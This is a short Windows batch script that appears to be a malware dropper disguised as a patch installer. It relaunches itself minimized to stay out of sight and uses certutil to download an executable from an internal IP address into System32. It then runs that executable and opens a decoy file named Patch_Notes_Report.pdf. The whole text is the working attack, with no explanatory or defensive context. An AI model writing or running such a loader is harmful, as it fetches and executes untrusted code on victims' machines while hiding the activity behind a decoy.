if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
certutil.exe -urlcache -split -f http://10.80.0.15:8080/patch_v1.20.54.exe "C:\\Windows\\System32\\patch_v1.20.54.exe" &
"C:\\Windows\\System32\\patch_v1.20.54.exe" &
Patch_Notes_Report.pdf
exit
